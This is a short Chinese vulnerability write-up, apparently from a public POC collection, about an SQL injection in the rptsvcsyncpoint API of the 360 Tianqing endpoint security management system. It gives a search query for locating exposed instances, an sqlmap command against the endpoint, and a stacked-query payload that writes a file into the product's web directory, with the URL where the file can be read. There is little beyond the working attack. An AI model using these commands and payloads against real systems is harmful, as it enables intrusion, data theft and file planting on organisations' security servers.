# 360天擎终端安全管理系统rptsvcsyncpoint存在SQL注入漏洞

# 一、漏洞简介
天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护;奇安信360天擎rptsvcsyncpoint存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。

# 二、影响版本
+ 360天擎终端安全管理系统

# 三、资产测绘
+ hunter`app.name=="天擎终端安全管理系统"`
+ 特征


# 四、漏洞复现
sqlmap

```plain
python3 sqlmap.py -u "https://xx.xx.xx.xx/api/dp/rptsvcsyncpoint?ccid=1" --batch --skip-waf
```


文件写入

```plain
/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('123456~');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\stc.txt';drop table O;--
```


写入文件位置

```plain
http://xx.xx.xx.xx/stc.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bmxoqmgt074w5sod>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
